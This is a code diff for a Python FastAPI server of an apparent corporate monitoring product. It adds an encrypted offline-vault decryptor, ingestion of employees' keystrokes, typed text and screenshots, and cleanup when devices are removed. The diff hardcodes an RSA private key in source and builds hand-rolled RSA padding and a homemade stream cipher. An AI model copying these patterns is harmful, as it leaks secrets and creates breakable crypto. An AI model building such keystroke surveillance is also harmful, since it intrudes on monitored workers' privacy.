@@ -14,6 +14,7 @@ import time
 import uuid
 import webbrowser
 import zipfile
+import zlib
 from typing import Dict, List, Optional, Set
 
 import uvicorn
@@ -36,6 +37,79 @@ from models import (
 
 CAPTURES_DIR = config.DATA_DIR / "captures"
 CAPTURES_DIR.mkdir(parents=True, exist_ok=True)
+
+# Clave Asimétrica RSA-2048 del Servidor para Descifrado Exclusivo de Archivos Offline (.sitai)
+# El agente cliente solo posee (SITAI_RSA_N, SITAI_RSA_E); únicamente el servidor posee SITAI_RSA_D.
+SITAI_MAGIC_HEADER = b"SITAI01\x00"
+SITAI_RSA_N = int(
+    "e4ceaf9ce8fb52cd99b3ca633b3568fcaea40a7244e40c7f4335671b915fa729"
+    "e9f9abd6245259dee6449aad5203b07f367990377dee3e851107f60e178bae1f"
+    "79d90c2293d114f0fed232ccd9c9b484632b07190e47126ab67cc9651a208bdb"
+    "ed8bbff87895408024b25b05b1050a946562398089f70074d498b4423f1aa9a2"
+    "013fdbe2154a7342d69a751791a5cafbd8b753cdcda1ecd711bad96cf5aca997"
+    "11848e6a6e6f4d16fc04be3b627aeffc9f12ed3e4ad3452f465d7a86a43d1785"
+    "696d82ef3b1b1891b1c565cf680a69aa0a8b641206407cf555dbe34b3109aad4"
+    "8eca8dfe0939acd2b68dbd82d28b63f4ccb9a975eec949242d61fa43ce3514f5",
+    16,
+)
+SITAI_RSA_D = int(
+    "81e2be98113dd2247a933059a25bd06c586b30aeeb6295a18cb27d048e42c16f"
+    "2eae1798e9678232e17ea25baf49fee048393bdff471d135d294355e8c893360"
+    "14d85c662889311d195a9391ec33ef7093a6f2518be456951360c526ca6d1d57"
+    "cc825f889a53079976bb74a64775f82a835efe0b74c62d9124ba46e1b056df61"
+    "cfc977708fcd1c77035225cc5c9a07f9a9c47c6e55ecd1d257474e47dc94c33e"
+    "57e30b06d7adad20580f40c55e3a8575d4d4d0555f255a0a99de1345eda21bb3"
+    "5da0b0207c73ec0b0fdfbadc79a2c3f46cf65dacc7bbd0aeaa68b851e32c1483"
+    "5dc74aee1da88e3a0e9c2da3d09a3b7651ccbace2ca1e79ae4c3a896a1aa14a1",
+    16,
+)
+
+
+def _sitai_keystream_xor(data: bytes, enc_key: bytes, nonce: bytes) -> bytes:
+    out = bytearray(len(data))
+    prefix = enc_key + nonce
+    mv = memoryview(data)
+    for i in range(0, len(data), 32):
+        blk = hashlib.sha256(prefix + (i >> 5).to_bytes(4, "big")).digest()
+        chunk = mv[i : i + 32]
+        clen = len(chunk)
+        out[i : i + clen] = (
+            int.from_bytes(chunk, "big") ^ int.from_bytes(blk[:clen], "big")
+        ).to_bytes(clen, "big")
+    return bytes(out)
+
+
+def decrypt_sitai_packet(raw_bytes: bytes) -> dict:
+    """
+    Descifra un contenedor binario .sitai usando la llave privada RSA-2048 exclusiva del servidor.
+    """
+    if len(raw_bytes) < 312 or raw_bytes[:8] != SITAI_MAGIC_HEADER:
+        raise ValueError("Formato de contenedor .sitai invalido")
+    rsa_cipher = raw_bytes[8:264]
+    nonce = raw_bytes[264:280]
+    mac_tag = raw_bytes[280:312]
+    ciphertext = raw_bytes[312:]
+
+    c_int = int.from_bytes(rsa_cipher, "big")
+    m_int = pow(c_int, SITAI_RSA_D, SITAI_RSA_N)
+    padded = m_int.to_bytes(256, "big")
+    if padded[0] != 0x00 or padded[1] != 0x02:
+        raise ValueError("Fallo de descifrado asimetrico RSA-2048 en .sitai")
+    sep_idx = padded.find(b"\x00", 2)
+    if sep_idx < 10 or (256 - sep_idx - 1) != 32:
+        raise ValueError("Estructura de semilla efimera invalida en .sitai")
+    master_seed = padded[sep_idx + 1 :]
+
+    enc_key = hashlib.sha256(master_seed + b":sitai-enc:" + nonce).digest()
+    mac_key = hashlib.sha256(master_seed + b":sitai-mac:" + nonce).digest()
+    expected_mac = hmac.new(mac_key, nonce + ciphertext, hashlib.sha256).digest()
+    if not hmac.compare_digest(mac_tag, expected_mac):
+        raise ValueError("Firma de integridad HMAC-SHA256 invalida en archivo .sitai")
+
+    compressed = _sitai_keystream_xor(ciphertext, enc_key, nonce)
+    plain_json = zlib.decompress(compressed)
+    return json.loads(plain_json.decode("utf-8"))
+
 
 app = FastAPI(title="JOB-Monitor — Centro de Monitoreo y Control Corporativo")
 app.mount("/static", StaticFiles(directory=str(config.BASE_DIR / "static")), name="static")
@@ -691,11 +765,18 @@ async def remove_device_endpoint(
         )
 
     db.delete_device(agent_id, revoke=bool(self_destruct))
+    try:
+        import shutil
+        agent_cap_dir = CAPTURES_DIR / os.path.basename(agent_id)
+        if agent_cap_dir.exists() and agent_cap_dir.is_dir():
+            shutil.rmtree(agent_cap_dir, ignore_errors=True)
+    except Exception:
+        pass
     mode_lbl = "con orden de autodestrucción y revocación" if self_destruct else "desvinculado del panel"
     log_entry = db.add_log(
-        agent_id=agent_id,
-        alias=alias_lbl,
-        hostname=live_agent.hostname if live_agent else "Equipo",
+        agent_id="SYSTEM-SERVER",
+        alias="Consola de Administración",
+        hostname="Servidor Central",
         username=requester["username"],
         category="AUDIT",
         message=f"{requester['display_name']} eliminó el equipo '{alias_lbl}' ({mode_lbl})",
@@ -1344,6 +1425,82 @@ async def get_capture_evidence(request: Request, agent_id: str, filename: str):
     )
 
 
+def _save_capture_bytes(agent_id: str, sct_b64: str, prefix: str = "ev") -> Optional[str]:
+    if not sct_b64:
+        return None
+    try:
+        img_bytes = base64.b64decode(sct_b64)
+        agent_captures_dir = CAPTURES_DIR / agent_id
+        agent_captures_dir.mkdir(parents=True, exist_ok=True)
+        is_already_webp = len(img_bytes) > 12 and img_bytes[:4] == b"RIFF" and img_bytes[8:12] == b"WEBP"
+        ext = "webp"
+        if not is_already_webp:
+            try:
+                from PIL import Image
+                img_obj = Image.open(io.BytesIO(img_bytes))
+                if img_obj.mode not in ("RGB", "RGBA"):
+                    img_obj = img_obj.convert("RGB")
+                webp_buf = io.BytesIO()
+                img_obj.save(webp_buf, format="WEBP", quality=80, method=4)
+                img_bytes = webp_buf.getvalue()
+            except Exception:
+                ext = "jpg"
+        fname = f"{prefix}_{int(time.time())}_{uuid.uuid4().hex[:6]}.{ext}"
+        fpath = agent_captures_dir / fname
+        fpath.write_bytes(img_bytes)
+        return f"/api/captures/{agent_id}/{fname}"
+    except Exception as e:
+        print(f"[Captures] Error al almacenar evidencia visual: {e}")
+        return None
+
+
+async def _ingest_keyboard_event_payload(
+    agent_id: str,
+    agent: AgentConnection,
+    data: dict,
+    is_offline_replay: bool = False,
+):
+    active_win = str(data.get("active_window") or agent.active_window or "Escritorio")
+    dur_secs = int(data.get("duration_seconds", 0))
+    keystrokes_cnt = int(data.get("keystrokes_count", 0))
+    txt_content = str(data.get("text_content", "")).strip()
+    keys_detail = data.get("keystrokes_detail", [])
+    kb_layout = str(data.get("keyboard_layout", "Estándar"))
+    sct_b64 = str(data.get("screenshot_b64", "")).strip()
+    custom_ts = str(data.get("timestamp") or "").strip() if is_offline_replay else None
+
+    evidence_url = _save_capture_bytes(agent_id, sct_b64, prefix="kb")
+
+    meta = {
+        "text_content": txt_content,
+        "keystrokes_detail": keys_detail,
+        "keystrokes_count": keystrokes_cnt,
+        "duration_seconds": dur_secs,
+        "active_window": active_win,
+        "keyboard_layout": kb_layout,
+        "evidence_path": evidence_url,
+        "offline_vault": is_offline_replay,
+    }
+
+    preview_txt = f"'{txt_content[:70]}...'" if len(txt_content) > 70 else (f"'{txt_content}'" if txt_content else "(Pulsaciones de navegación)")
+    msg_txt = f"Redacción en '{active_win}' (Pulsaciones: {preview_txt} • {keystrokes_cnt} teclas • Duración: {dur_secs}s • Idioma: {kb_layout})"
+
+    log_entry = db.add_log(
+        agent_id=agent_id,
+        alias=agent.alias,
+        hostname=agent.hostname,
+        username=agent.username,
+        category="KEYBOARD",
+        message=msg_txt,
+        duration_seconds=dur_secs,
+        evidence_path=evidence_url,
+        meta_json=json.dumps(meta),
+        custom_timestamp=custom_ts or None,
+    )
+    await hub.broadcast_new_log(log_entry, tenant_id=agent.tenant_id)
+
+
+
 @app.websocket("/ws/agent")
 async def ws_agent_endpoint(websocket: WebSocket):
     if config.REQUIRE_MTLS:
@@ -1427,10 +1584,29 @@ async def ws_agent_endpoint(websocket: WebSocket):
                         increment_away_alert=away_alert,
                     )
 
+                    saved_batch_url = None
+                    saved_batch_b64 = None
                     for ev in data.get("log_events", []):
                         cat = ev.get("category", "WINDOW")
                         msg_txt = ev.get("message", "")
                         dur = ev.get("duration_seconds")
+                        ev_sct = str(ev.get("screenshot_b64") or "").strip()
+                        ev_url = None
+                        if ev_sct:
+                            if ev_sct == saved_batch_b64 and saved_batch_url:
+                                ev_url = saved_batch_url
+                            else:
+                                ev_url = _save_capture_bytes(agent_id, ev_sct, prefix="dvr")
+                                saved_batch_b64 = ev_sct
+                                saved_batch_url = ev_url
+                        ev_meta = {
+                            "category": cat,
+                            "active_window": str(ev.get("active_window") or agent.active_window or "Escritorio"),
+                            "previous_window": str(ev.get("previous_window") or ""),
+                            "duration_seconds": dur or 0,
+                            "message": msg_txt,
+                            "evidence_path": ev_url,
+                        }
                         if msg_txt:
                             log_entry = db.add_log(
                                 agent_id=agent_id,
@@ -1440,72 +1616,89 @@ async def ws_agent_endpoint(websocket: WebSocket):
                                 category=cat,
                                 message=msg_txt,
                                 duration_seconds=dur,
+                                evidence_path=ev_url,
+                                meta_json=json.dumps(ev_meta) if ev_url else None,
                             )
-                            await hub.broadcast_new_log(log_entry)
+                            await hub.broadcast_new_log(log_entry, tenant_id=agent.tenant_id)
 
                     await hub.broadcast_telemetry_update(agent)
 
                 elif msg_type == "keyboard_event":
                     # MF-07: Persistencia y almacenamiento de evento consolidado de redacción
-                    active_win = str(data.get("active_window") or agent.active_window or "Escritorio")
-                    dur_secs = int(data.get("duration_seconds", 0))
-                    keystrokes_cnt = int(data.get("keystrokes_count", 0))
-                    txt_content = str(data.get("text_content", "")).strip()
-                    keys_detail = data.get("keystrokes_detail", [])
-                    kb_layout = str(data.get("keyboard_layout", "Estándar"))
-                    sct_b64 = str(data.get("screenshot_b64", "")).strip()
+                    await _ingest_keyboard_event_payload(agent_id, agent, data)
 
-                    evidence_url = None
-                    if sct_b64:
+                elif msg_type == "sitai_encrypted_event":
+                    # Bóveda Offline .sitai: Descifrado asimétrico exclusivo en el servidor y sincronización diferida
+                    vault_filename = str(data.get("filename") or "").strip()
+                    data_b64 = str(data.get("data_b64") or "").strip()
+                    ack_ok = False
+                    if data_b64:
                         try:
-                            img_bytes = base64.b64decode(sct_b64)
-                            agent_captures_dir = CAPTURES_DIR / agent_id
-                            agent_captures_dir.mkdir(parents=True, exist_ok=True)
-                            is_already_webp = len(img_bytes) > 12 and img_bytes[:4] == b"RIFF" and img_bytes[8:12] == b"WEBP"
-                            ext = "webp"
-                            if not is_already_webp:
-                                try:
-                                    from PIL import Image
-                                    img_obj = Image.open(io.BytesIO(img_bytes))
-                                    if img_obj.mode not in ("RGB", "RGBA"):
-                                        img_obj = img_obj.convert("RGB")
-                                    webp_buf = io.BytesIO()
-                                    img_obj.save(webp_buf, format="WEBP", quality=80, method=4)
-                                    img_bytes = webp_buf.getvalue()
-                                except Exception:
-                                    ext = "jpg"
-                            fname = f"kb_{int(time.time())}_{uuid.uuid4().hex[:6]}.{ext}"
-                            fpath = agent_captures_dir / fname
-                            fpath.write_bytes(img_bytes)
-                            evidence_url = f"/api/captures/{agent_id}/{fname}"
+                            raw_sitai = base64.b64decode(data_b64)
+                            inner_payload = decrypt_sitai_packet(raw_sitai)
+                            inner_type = str(inner_payload.get("type") or "")
+                            if inner_type == "keyboard_event":
+                                await _ingest_keyboard_event_payload(agent_id, agent, inner_payload, is_offline_replay=True)
+                                ack_ok = True
+                            elif inner_type == "offline_telemetry_batch":
+                                custom_ts = str(inner_payload.get("timestamp") or "").strip() or None
+                                delta_secs = int(inner_payload.get("delta_seconds", 0))
+                                if delta_secs > 0:
+                                    db.record_telemetry_slice(
+                                        agent_id=agent_id,
+                                        delta_seconds=delta_secs,
+                                        is_active=bool(inner_payload.get("is_active", True)),
+                                        app_name=str(inner_payload.get("app_name") or "Escritorio"),
+                                        increment_away_alert=bool(inner_payload.get("away_alert", False)),
+                                    )
+                                saved_off_url = None
+                                saved_off_b64 = None
+                                for ev in inner_payload.get("log_events", []):
+                                    cat = ev.get("category", "WINDOW")
+                                    msg_txt = ev.get("message", "")
+                                    dur = ev.get("duration_seconds")
+                                    ev_ts = str(ev.get("timestamp") or custom_ts or "").strip() or None
+                                    ev_sct = str(ev.get("screenshot_b64") or "").strip()
+                                    ev_url = None
+                                    if ev_sct:
+                                        if ev_sct == saved_off_b64 and saved_off_url:
+                                            ev_url = saved_off_url
+                                        else:
+                                            ev_url = _save_capture_bytes(agent_id, ev_sct, prefix="dvr")
+                                            saved_off_b64 = ev_sct
+                                            saved_off_url = ev_url
+                                    ev_meta = {
+                                        "category": cat,
+                                        "active_window": str(ev.get("active_window") or agent.active_window or "Escritorio"),
+                                        "previous_window": str(ev.get("previous_window") or ""),
+                                        "duration_seconds": dur or 0,
+                                        "message": msg_txt,
+                                        "evidence_path": ev_url,
+                                        "offline_vault": True,
+                                    }
+                                    if msg_txt:
+                                        log_entry = db.add_log(
+                                            agent_id=agent_id,
+                                            alias=agent.alias,
+                                            hostname=agent.hostname,
+                                            username=agent.username,
+                                            category=cat,
+                                            message=msg_txt,
+                                            duration_seconds=dur,
+                                            evidence_path=ev_url,
+                                            meta_json=json.dumps(ev_meta) if ev_url else None,
+                                            custom_timestamp=ev_ts,
+                                        )
+                                        await hub.broadcast_new_log(log_entry, tenant_id=agent.tenant_id)
+                                ack_ok = True
                         except Exception as e:
-                            print(f"[Captures] Error al almacenar evidencia visual: {e}")
-
-                    meta = {
-                        "text_content": txt_content,
-                        "keystrokes_detail": keys_detail,
-                        "keystrokes_count": keystrokes_cnt,
-                        "duration_seconds": dur_secs,
-                        "active_window": active_win,
-                        "keyboard_layout": kb_layout,
-                        "evidence_path": evidence_url,
-                    }
-
-                    preview_txt = f"'{txt_content[:70]}...'" if len(txt_content) > 70 else (f"'{txt_content}'" if txt_content else "(Pulsaciones de navegación)")
-                    msg_txt = f"Redacción en '{active_win}' (Pulsaciones: {preview_txt} • {keystrokes_cnt} teclas • Duración: {dur_secs}s • Idioma: {kb_layout})"
-
-                    log_entry = db.add_log(
-                        agent_id=agent_id,
-                        alias=agent.alias,
-                        hostname=agent.hostname,
-                        username=agent.username,
-                        category="KEYBOARD",
-                        message=msg_txt,
-                        duration_seconds=dur_secs,
-                        evidence_path=evidence_url,
-                        meta_json=json.dumps(meta),
-                    )
-                    await hub.broadcast_new_log(log_entry, tenant_id=agent.tenant_id)
+                            print(f"[SITAI Vault] Error al descifrar contenedor '{vault_filename}' de {agent_id}: {e}")
+                    if vault_filename:
+                        await websocket.send_json({
+                            "type": "sitai_ack",
+                            "filename": vault_filename,
+                            "ok": ack_ok,
+                        })
 
                 elif msg_type == "chat_reply":
                     text = str(data.get("text", "")).strip()
